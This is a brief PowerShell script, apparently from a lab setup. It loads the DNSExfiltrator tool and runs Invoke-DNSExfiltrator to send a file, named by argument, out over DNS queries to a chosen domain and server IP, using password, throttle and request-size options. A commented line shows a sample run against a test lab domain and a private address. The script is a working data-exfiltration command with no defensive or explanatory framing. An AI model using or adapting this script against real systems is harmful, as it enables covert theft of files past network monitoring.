$pathFile = $args[0]
$domain = $args[1]
$password = $args[2]
$serverIP = $args[3]
$throttleTime = $args[4]
$requestMaxSize = $args[5]

Import-Module C:\\Users\\Client\\Documents\\DNSExfiltrator-master\\Invoke-DNSExfiltrator.ps1

#Invoke-DNSExfiltrator -i C:\\Users\\Loic\\Documents\\testWindows.txt -d testlab.lan -p test -s 10.0.2.7 -t 500
Invoke-DNSExfiltrator -i $pathFile -d $domain -p $password -s $serverIP -t $throttleTime -r $requestMaxSize
